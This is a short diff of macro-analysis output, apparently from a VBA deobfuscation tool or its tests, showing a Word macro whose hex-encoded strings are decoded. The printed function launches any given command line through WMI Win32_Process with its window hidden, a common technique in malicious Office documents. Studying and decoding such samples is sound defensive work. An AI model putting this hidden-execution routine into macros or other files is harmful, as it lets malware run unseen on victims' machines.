@@ -71,11 +71,11 @@ VBA MACRO lkxosgcqm.bas
 in file: word/vbaProject.bin - OLE stream: 'VBA/lkxosgcqm'
 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Function kshliitwryv(cmdLine As String) As Integer
-Set rpmcsqkfmmefrk = GetObject(lylhbzknnnzm("77696e6d676d74") & lylhbzknnnzm("733a5c5c2e5c726f6f745c63696d7632"))
-Set apcpmobozbywheter = rpmcsqkfmmefrk.Get(lylhbzknnnzm("57696e33325f50726f6365") & lylhbzknnnzm("737353746172747570"))
+Set rpmcsqkfmmefrk = GetObject(lylhbzknnnzm("winmgmt") & lylhbzknnnzm("s:\\.\root\cimv2"))
+Set apcpmobozbywheter = rpmcsqkfmmefrk.Get(lylhbzknnnzm("Win32_Proce") & lylhbzknnnzm("ssStartup"))
 Set ojuovddfgrz = apcpmobozbywheter.SpawnInstance_
 ojuovddfgrz.ShowWindow = 0
-Set jcjvmxzi = GetObject(lylhbzknnnzm("77696e6d676d74733a5c5c2e5c726f6f745c63696d76323a57") & lylhbzknnnzm("696e33325f50726f63657373"))
+Set jcjvmxzi = GetObject(lylhbzknnnzm("winmgmts:\\.\root\cimv2:W") & lylhbzknnnzm("in32_Process"))
 kshliitwryv = jcjvmxzi.Create(cmdLine, Null, ojuovddfgrz, intProcessID)
 End Function
 Private Function lylhbzknnnzm(ByVal wawaggaffhsu As String) As String
